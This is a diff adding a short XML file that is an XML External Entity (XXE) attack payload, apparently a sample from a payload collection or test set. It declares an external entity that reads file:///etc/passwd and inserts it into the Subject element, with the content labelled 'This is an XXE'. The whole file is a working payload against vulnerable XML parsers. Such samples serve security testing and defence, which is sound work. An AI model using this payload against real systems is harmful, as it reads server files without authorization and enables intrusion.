@@ -1,0 +1,11 @@
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data (ANY)>
+<!ENTITY XXE SYSTEM "file:///etc/passwd">
+]>
+<xml>
+	<Author>blackarchguru</Author>
+	<Subject>&XXE;</Subject>
+	<Content>This is an XXE</Content>
+</xml>
+
